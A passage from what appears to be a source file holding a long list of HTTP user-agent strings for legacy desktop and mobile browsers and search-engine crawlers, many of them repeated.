               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',
               'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
               'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
               'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
               'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0',
               'Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0',
               'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0',
               'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
               'Mozilla/5.0(compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)',
               'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)',
               'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+',
               'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+',
               'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+',
               'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5',
               'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
               'Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10',
               'Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',
               'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
               'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
               'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
               'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0',
               'Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0',
               'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0',
               'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
               'Mozilla/5.0(compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)',
               'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)',
               'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+',
               'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+',
               'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+',
               'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5',
               'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
               'Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10',
               'Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
